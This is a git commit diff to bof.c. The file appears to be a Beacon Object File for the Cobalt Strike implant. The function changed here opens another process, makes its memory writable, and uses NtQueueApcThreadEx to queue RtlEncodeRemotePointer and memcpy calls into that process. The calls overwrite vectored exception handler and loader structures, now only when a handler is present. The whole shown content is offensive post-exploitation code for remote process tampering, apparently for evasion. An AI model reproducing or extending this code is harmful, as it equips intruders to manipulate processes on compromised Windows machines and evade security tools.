11d76bd7d761d05902397cc823cbf12a7014b645
mannyfreddy <113118336+mannyfred@users.noreply.github.com>
2025-01-23 10:26:28 +0200

    minor stuff

--- bof.c
+++ bof.c
@@ -92,27 +92,14 @@ BOOL FixShit(ULONG pid) {
 
     NTDLL$NtClose(hProcess);
 
-    if ((STATUS = NTDLL$NtOpenProcess(&hProcess, PROCESS_VM_OPERATION, &oa, &cid)) != 0x00) {
-        BeaconPrintf(CALLBACK_ERROR, "NtOpenProcess: 0x%0.8X", STATUS);
-        goto _End;
-    }
-
-    //First entry usually in RO memory, we can just leave it as RW
-    if ((STATUS = NTDLL$NtProtectVirtualMemory(hProcess, &pAligned, &szMem, PAGE_READWRITE, &old)) != 0x00) {
-        BeaconPrintf(CALLBACK_ERROR, "NtProtectVirtualMemory: 0x%0.8X", STATUS);
-        goto _End;
-    }
-
     STATUS = NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ret);
 
     ret += PAGE_SIZE;
     SYSTEM_PROCESS_INFORMATION* pInfo = (SYSTEM_PROCESS_INFORMATION*)NTDLL$RtlAllocateHeap(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ret);
+
     if (!pInfo) goto _End;
-
     pFree = pInfo;
-
-    if ((STATUS = NTDLL$NtQuerySystemInformation(SystemProcessInformation, pInfo, ret, &ret)) != 0x00)
-        goto _End;
+    if ((STATUS = NTDLL$NtQuerySystemInformation(SystemProcessInformation, pInfo, ret, &ret)) != 0x00) goto _End;
 
     while (TRUE) {
 
@@ -123,12 +110,28 @@ BOOL FixShit(ULONG pid) {
                 goto _End;
             }
 
-            if ((STATUS = NTDLL$NtQueueApcThreadEx(hThread, (HANDLE)0x1, NTDLL$RtlEncodeRemotePointer, (HANDLE)-1, pRetExec, pPointer)) != 0x00) {
-                BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThreadEx: 0x%0.8X", STATUS);
-                goto _End;
+            if (list.FirstVEH != (PVOID)((ULONG_PTR)pHandlerList + 8)) {
+
+                if ((STATUS = NTDLL$NtOpenProcess(&hProcess, PROCESS_VM_OPERATION, &oa, &cid)) != 0x00) {
+                    BeaconPrintf(CALLBACK_ERROR, "NtOpenProcess: 0x%0.8X", STATUS);
+                    goto _End;
+                }
+
+                //First entry usually in RO memory, we can just leave it as RW
+                if ((STATUS = NTDLL$NtProtectVirtualMemory(hProcess, &pAligned, &szMem, PAGE_READWRITE, &old)) != 0x00) {
+                    BeaconPrintf(CALLBACK_ERROR, "NtProtectVirtualMemory: 0x%0.8X", STATUS);
+                    goto _End;
+                }
+
+                if ((STATUS = NTDLL$NtQueueApcThreadEx(hThread, (HANDLE)0x1, NTDLL$RtlEncodeRemotePointer, (HANDLE)-1, pRetExec, pPointer)) != 0x00) {
+                    BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThreadEx: 0x%0.8X", STATUS);
+                    goto _End;
+                }
+            } else {
+                BeaconPrintf(CALLBACK_OUTPUT, "[i] No VEH found");
             }
 
-            if ((STATUS = NTDLL$NtQueueApcThreadEx(hThread, (HANDLE)0x1, NTDLL$memcpy, (PVOID*)((ULONG_PTR)pLdr + 0x20), (PVOID)(ULONG_PTR)pLdr + 0xe8, (PVOID)sizeof(PVOID))) != 0x00) {
+            if ((STATUS = NTDLL$NtQueueApcThreadEx(hThread, (HANDLE)0x1, NTDLL$memcpy, (PVOID*)((ULONG_PTR)pLdr + 0x20), (PVOID)((ULONG_PTR)pLdr + 0xe8), (PVOID)sizeof(PVOID))) != 0x00) {
                 BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThreadEx: 0x%0.8X", STATUS);
                 goto _End;
             }
